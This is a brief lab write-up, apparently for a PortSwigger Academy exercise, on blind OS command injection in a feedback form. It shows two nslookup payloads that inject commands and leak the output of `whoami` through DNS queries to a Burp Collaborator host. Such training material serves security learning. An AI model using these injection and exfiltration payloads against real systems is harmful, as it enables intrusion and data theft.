# Blind OS Command Injection — Exfiltrating Data via Out-of-Band Channel

This exercise builds on the previous one, still involving a blind OS command injection in the feedback function.

User-supplied input is again inserted into a server-side shell command, which executes asynchronously and does not influence the HTTP response. Output can't be redirected anywhere accessible either — so data has to be smuggled out through an out-of-band DNS interaction.

**Goal:** Run `whoami` and leak its result by embedding it into a DNS query sent to Burp Collaborator, then submit the recovered username to finish the lab.

Note: Because the Academy's firewall prevents the lab from contacting arbitrary external systems, you must rely on Burp Collaborator's default public server for this to succeed.

---

**Reference:**
- https://portswigger.net/web-security/os-command-injection

pic 1

---

The feedback form accepts out-of-band interaction through this payload:

```
$(nslookup juh2fcq2cctj3nb1g8ecp69m6dc400op.oastify.com)
```

pic 2

Using the following payload, the username `peter-0B6BNY` was successfully extracted:

```
$(nslookup `whoami`.m1o5mfx5jf0maqi4nblfw9gpdgj774vt.oastify.com)
```

pic 3

pic 4
